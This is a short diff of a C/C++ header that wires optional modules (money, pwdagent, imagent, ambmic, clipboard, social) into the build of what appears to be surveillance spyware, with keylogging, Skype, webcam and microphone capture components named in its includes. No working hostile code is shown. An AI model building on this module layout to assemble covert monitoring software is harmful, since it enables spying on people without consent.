@@ -1,3 +1,5 @@
+#include <config.h>
+
 ////////////////////////////////////////////////////////////////////////////////
 ////////////////////////////////////////////////////////////////////////////////
 //
@@ -55,6 +57,39 @@ void HM_U2A(char *buffer);
 void LockConfFile();
 void UnlockConfFile();
 
+/// SECTION for building modules
+
+#ifdef __ENABLE_MONEY_MODULE
+void PM_MoneyRegister();
+#pragma comment(lib, "money")
+#endif
+
+#ifdef __ENABLE_PWDAGENT_MODULE
+#pragma comment(lib, "pwdagent")
+#endif
+
+#ifdef __ENABLE_IMAGENT_MODULE
+#pragma comment(lib, "imagent")
+#endif
+
+#ifdef __ENABLE_AMBMIC_MODULE
+#pragma comment(lib, "ambmic")
+#endif
+
+#ifdef __ENABLE_CLIPBOARD_MODULE
+#pragma comment(lib, "clipboard")
+#endif
+
+#ifdef __ENABLE_PDAGENT_MODULE
+#pragma comment(lib, "pdagent")
+#endif
+
+#ifdef __ENABLE_SOCIAL_MODULE
+#pragma comment(lib, "social")
+#endif
+
+/// SECTION for building modules
+
 #include <json/JSON.h>
 #include "HM_ProcessMonitors.h" // XXX da modificare
 #include "HM_KeyLog.h" // XXX da modificare
@@ -65,12 +100,12 @@ void UnlockConfFile();
 #include "HM_SkypeRecord.h" // XXX da modificare 
 #include "HM_UrlLog.h" // XXX da modificare 
 #include "HM_WebCam.h" // XXX da modificare 
-#include "HM_AmbMic.h" // XXX da modificare 
+void PM_AmbMicRegister();
 #include "HM_MailCap.h" // XXX da modificare 
 #include "HM_Pstorage.h" // XXX da modificare 
 extern void PM_IMRegister();	// defined in /modules/imagent
 #include "HM_LogDevice.h" // XXX da modificare 
-#include "HM_Money.h" // XXX da modificare 
+
 #include "HM_MouseLog.h" // XXX da modificare
 #include "HM_Application.h" // XXX da modificare
 #include "HM_PDAAGent.h" // XXX da modificare
